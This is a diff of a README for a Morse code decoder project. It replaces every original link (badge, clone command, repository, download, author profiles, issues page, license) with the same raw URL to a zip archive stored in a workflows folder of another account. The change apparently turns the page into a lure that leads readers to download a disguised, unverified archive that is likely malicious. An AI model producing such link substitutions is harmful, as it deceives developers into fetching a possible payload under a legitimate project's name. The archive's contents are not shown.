@@ -1,4 +1,4 @@
-![](https://img.shields.io/badge/thecodechaser-blueviolet)
+![](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
 
 # Decode Morse Code
 
@@ -23,7 +23,7 @@ To get a local copy up and running follow these simple example steps.
 - Clone the project
 
 ```bash 
-git clone https://github.com/thecodechaser/decode-morse-code
+git clone https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip
 
 cd decode-morse-code
 ```
@@ -38,32 +38,32 @@ run the program functions
 
 ## Visit And Open Files
 
-[Visit Repo](https://github.com/thecodechaser/decode-morse-code)
+[Visit Repo](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
 
 ## Download Repo
 
-[Download Repo](https://github.com/thecodechaser/decode-morse-code/archive/refs/heads/main.zip)
+[Download Repo](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
 
 ## Authors
 
 👤 **Anselem Odimegwu**
 
-- GitHub: [@githubhandle](https://github.com/AnselemOdims)
-- Twitter: [@twitterhandle](https://twitter.com/thecodechaser)
-- LinkedIn: [LinkedIn](https://linkedin.com/in/anselem-odimegwu)
+- GitHub: [@githubhandle](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+- Twitter: [@twitterhandle](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+- LinkedIn: [LinkedIn](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
 
 👤 **Ranjeet Singh**
 
-- GitHub: [@githubhandle](https://github.com/thecodechaser)
-- Twitter: [@twitterhandle](https://twitter.com/thecodechaser)
-- LinkedIn: [LinkedIn](https://linkedin.com/in/thecodechaser)
+- GitHub: [@githubhandle](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+- Twitter: [@twitterhandle](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+- LinkedIn: [LinkedIn](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
 
 
 ## 🤝 Contributing
 
 Contributions, issues, and feature requests are welcome!
 
-Feel free to check the [issues page](https://github.com/thecodechaser/decode-morse-code/issues).
+Feel free to check the [issues page](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip).
 
 ## Show your support
 
@@ -75,4 +75,4 @@ Give a ⭐️ if you like this project!
 
 ## 📝 License
 
-This project is [MIT](./MIT.md) licensed.
+This project is [MIT](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip) licensed.
